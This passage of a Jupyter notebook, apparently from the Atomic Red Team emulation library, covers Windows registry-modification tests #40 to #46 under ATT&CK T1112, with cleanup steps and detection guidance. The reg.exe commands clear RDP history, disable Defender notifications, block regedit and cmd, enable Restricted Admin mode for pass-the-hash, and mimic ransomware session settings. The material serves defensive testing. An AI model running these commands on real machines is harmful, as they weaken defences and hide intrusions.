   "source": "#### Cleanup: \n```cmd\nreg delete HKCU\\Software\\AppDataLow\\Software\\Microsoft\\3A861D62-51E0-15700F2219A4 /va /f >nul 2>&1\nreg delete HKCU\\Software\\AppDataLow\\Software\\Microsoft\\3A861D62-51E0-15700F2219A4 /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0a2c531b",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 40 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "b6380151",
   "metadata": {},
   "source": "### Atomic Test #41 - Terminal Server Client Connection History Cleared\nThe built-in Windows Remote Desktop Connection (RDP) client (mstsc.exe) saves the remote computer name (or IP address) and the username that is used to login after each successful connection to the remote computer\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: Must have the \"MR9\" Remote Desktop Connection history Key \n\n##### Check Prereq Commands:\n```cmd\nif ((Get-ItemProperty -Path \"HKCU:\\SOFTWARE\\Microsoft\\Terminal Server Client\\Default\\\").MR9) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nNew-Item -path \"HKCU:\\SOFTWARE\\Microsoft\\\" -name \"Terminal Server Client\"  -ErrorAction Ignore\nNew-Item -path \"HKCU:\\SOFTWARE\\Microsoft\\Terminal Server Client\\\" -name \"Default\" -ErrorAction Ignore\nNew-Itemproperty -path \"HKCU:\\SOFTWARE\\Microsoft\\Terminal Server Client\\Default\" -name \"MR9\" -value \"127.0.0.1\"  -PropertyType \"String\" -ErrorAction Ignore\nNew-Item -path \"HKCU:\\SOFTWARE\\Microsoft\\Terminal Server Client\\\" -name \"Servers\" -ErrorAction Ignore\nNew-Item -path \"HKCU:\\SOFTWARE\\Microsoft\\Terminal Server Client\\Servers\" -name \"Redcanary\" -ErrorAction Ignore\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a1f7ce12",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 41 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "6d2fa2a8",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\" /va /f\nreg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers\" /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "48e8fabb",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 41"
  },
  {
   "cell_type": "markdown",
   "id": "cebc727e",
   "metadata": {},
   "source": [
    "### Atomic Test #42 - Disable Windows Error Reporting Settings",
    "Modify the registry of the currently logged in user using reg.exe via cmd console to disable windows error reporting settings. This Windows feature allow the use to report bug, errors, failure or problems \nencounter in specific application or process.\nSee how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add HKLM64\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Reporting /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f\nreg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Reporting /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2a5462f4",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 42"
  },
  {
   "cell_type": "markdown",
   "id": "2dbf93af",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete HKLM64\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Reporting /v DisableEnhancedNotifications /f >nul 2>&1\nreg delete HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Reporting /v DisableEnhancedNotifications /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ff42e530",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 42 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "11004952",
   "metadata": {},
   "source": [
    "### Atomic Test #43 - DisallowRun Execution Of Certain Applications",
    "Modify the registry of the currently logged in user using reg.exe via cmd console to prevent user running specific computer programs that could aid them in manually removing malware or detecting it \nusing security product.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v DisallowRun /t REG_DWORD /d 1 /f\nreg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun /f /t REG_SZ /v art1 /d \"regedit.exe\"\nreg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun /f /t REG_SZ /v art2 /d \"cmd.exe\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "af8c0f21",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 43"
  },
  {
   "cell_type": "markdown",
   "id": "5119805e",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v DisallowRun /f >nul 2>&1\nreg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun /v art1 /f >nul 2>&1\nreg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun /v art2 /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "cd2a8105",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 43 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "fd106e7f",
   "metadata": {},
   "source": [
    "### Atomic Test #44 - Enabling Restricted Admin Mode via Command_Prompt",
    "Enabling Restricted Admin Mode via Command_Prompt,enables an attacker to perform a pass-the-hash attack using RDP.\n\nSee [Passing the Hash with Remote Desktop](https://www.kali.org/blog/passing-hash-remote-desktop/)\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"hklm\\system\\currentcontrolset\\control\\lsa\" /f /v DisableRestrictedAdmin /t REG_DWORD /d 0\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "21c114a6",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 44"
  },
  {
   "cell_type": "markdown",
   "id": "e839b2dd",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete \"hklm\\system\\currentcontrolset\\control\\lsa\" /f /v DisableRestrictedAdmin >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7a2c7ead",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 44 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "e30c9cd6",
   "metadata": {},
   "source": [
    "### Atomic Test #45 - Mimic Ransomware - Enable Multiple User Sessions",
    "This test emulates Mimic ransomware's ability to enable multiple user sessions by modifying the AllowMultipleTSSessions value within the Winlogon registry key. \nSee [Mimic Ransomware Overview] (https://www.trendmicro.com/en_us/research/23/a/new-mimic-ransomware-abuses-everything-apis-for-its-encryption-p.html)\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Winlogon /t REG_DWORD /v AllowMultipleTSSessions /d 1 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f075f205",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 45"
  },
  {
   "cell_type": "markdown",
   "id": "fdf8917b",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Winlogon /v AllowMultipleTSSessions /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1daba53f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 45 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "28f03d73",
   "metadata": {},
   "source": [
    "### Atomic Test #46 - Mimic Ransomware - Allow Multiple RDP Sessions per User",
    "This test emulates Mimic ransomware's ability to enable multiple RDP sessions per user by modifying the fSingleSessionPerUser value within the Terminal Server registry key. \nSee [Mimic Ransomware Overview] (https://www.trendmicro.com/en_us/research/23/a/new-mimic-ransomware-abuses-everything-apis-for-its-encryption-p.html)\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5bbe1672",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 46"
  },
  {
   "cell_type": "markdown",
   "id": "71489711",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fSingleSessionPerUser /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4d3f833f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 46 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "8908379e",
   "metadata": {},
   "source": "## Detection\nModifications to the Registry are normal and occur throughout typical use of the Windows operating system. Consider enabling Registry Auditing on specific keys to produce an alertable event (Event ID 4657) whenever a value is changed (though this may not trigger when values are created with Reghide or other evasive methods). (Citation: Microsoft 4657 APR 2017) Changes to Registry entries that load software on Windows startup that do not correlate with known software, patch cycles, etc., are suspicious, as are additions or changes to files within the startup folder. Changes could also include new services and modification of existing binary paths to point to malicious files. If a change to a service-related entry occurs, then it will likely be followed by a local or remote service start or restart to execute the file.\n\nMonitor processes and command-line arguments for actions that could be taken to change or delete information in the Registry. Remote access tools with built-in features may interact directly with the Windows API to gather information. The Registry may also be modified through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001), which may require additional logging features to be configured in the operating system to collect necessary information for analysis.\n\nMonitor for processes, command-line arguments, and API calls associated with concealing Registry keys, such as Reghide. (Citation: Microsoft Reghide NOV 2006) Inspect and cleanup malicious hidden Registry entries using Native Windows API calls and/or tools such as Autoruns (Citation: SpectorOps Hiding Reg Jul 2017) and RegDelNull (Citation: Microsoft RegDelNull July 2016)."
  },
  {
   "cell_type": "markdown",
   "id": "7af0f3ad",
   "metadata": {},
   "source": "\n## Shield Active Defense\n### Baseline \n Identify key system elements to establish a baseline and be prepared to reset a system to that baseline when necessary. \n\n Identify elements of software and configuration critical to a set of objectives, define their proper values, and be prepared to reset a running system to its intended state.  \n#### Opportunity\nThere is an opportunity to utilize known good copies of registry information and restore it if an adversary makes any changes.\n#### Use Case\nA defender can enable Registry Auditing on specific keys to produce an alerts whenever a value is changed and revert those keys to baseline.\n#### Procedures\nMaintain a verified baseline firewall configuration and use that copy as a fallback if an adversary alters that information.\nMaintain a verified list of group policies enforced on a system and use that copy if an adversary attempts to deviate from the baseline.\n"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "PowerShell",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "PowerShell",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}